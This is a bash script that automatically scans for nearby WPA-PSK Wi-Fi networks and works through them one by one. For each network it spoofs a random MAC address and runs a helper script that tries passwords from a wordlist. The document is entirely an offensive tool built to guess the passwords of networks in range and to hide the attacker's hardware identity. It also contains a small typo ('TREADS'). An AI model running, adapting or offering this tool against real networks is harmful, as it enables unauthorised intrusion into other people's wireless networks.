#!/bin/bash

RED='\x1b[31m'
GREEN='\x1b[32m'
GREY='\x1b[90m'
RESET='\x1b[0m'

[ -z "$IFACE" ] && IFACE=wlan0
[ -z "$TIMEOUT" ] && TIMEOUT=15
[ -z "$THREADS" ] && TREADS=4
passwords=()
[[ $# -ge 1 ]] && passwords=($*) || while read password; do passwords+=("$password"); done
#passwords=(12345678 123456789 1234567890 qwertyuiop 1q2w3e4r 987654321 1q2w3e4r5t qazwsxedc 11111111)

#sudo killall -KILL wpa_supplicant 2> /dev/null
mkdir /tmp/wpa_brute 2> /dev/null && chmod o+rw /tmp/wpa_brute

while :
do
  sudo ifconfig $IFACE up
  typeset -a bssids=()
  typeset -a essids=()
  typeset -a signals=()
  echo -ne $GREY'scanning...              \r'$RESET
  IFS=$'\x0a'
  for line in $(sudo iw dev $IFACE scan 2> /dev/null | egrep '^BSS|SSID:|signal:|Authentication' | tr $'\n' $'\t' | sed -e 's/BSS/\nBSS/g' | grep 'PSK')
  do
    IFS=$'\t' read bssid signal essid <<< $(echo "$line" | sed -rn 's/BSS (.+)\(.*\t+signal: (.*).00 dBm.*\t+SSID: ([^\t]+)\t.*/\1\t\2\t\3/p')
    if [ -n "$essid" ]; then
      #echo "[*] $bssid $signal $essid"
      bssids+=($bssid)
      essids+=($essid)
      signals+=($signal)
    fi
  done

  for ((i=0; i<${#bssids[@]}; i++))
  do
    echo "${essids[i]}"$'\t'"${bssids[i]}"$'\t'"${signals[i]}"
  done | sort -n -k 3 -r | uniq > /tmp/wpa_brute/wpa_net.txt

  IFS=$'\x0a'
  for net in $(cat /tmp/wpa_brute/wpa_net.txt)
  do
    IFS=$'\t' read essid bssid signal <<< $(echo "$net")
    if fgrep -q "$essid" /tmp/wpa_brute/essids_known.txt 1> /dev/null 2> /dev/null; then
      continue
    fi
    echo "[*] $essid $bssid $signal"
    sudo ifconfig $IFACE down; sudo ifconfig $IFACE hw ether "00:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]" 2> /dev/null; sudo ifconfig $IFACE up
    threads=0
    for password in ${passwords[*]}
    do ((threads++)) 
      echo "$password"
    done > /tmp/wpa_brute/wordlist.txt
    timeout $TIMEOUT $(dirname "$0")/wpa_brute.sh "$essid" /tmp/wpa_brute/wordlist.txt $(( threads<=THREADS ? threads : THREADS ))
    echo "$essid" >> /tmp/wpa_brute/essids_known.txt
    break
  done
done
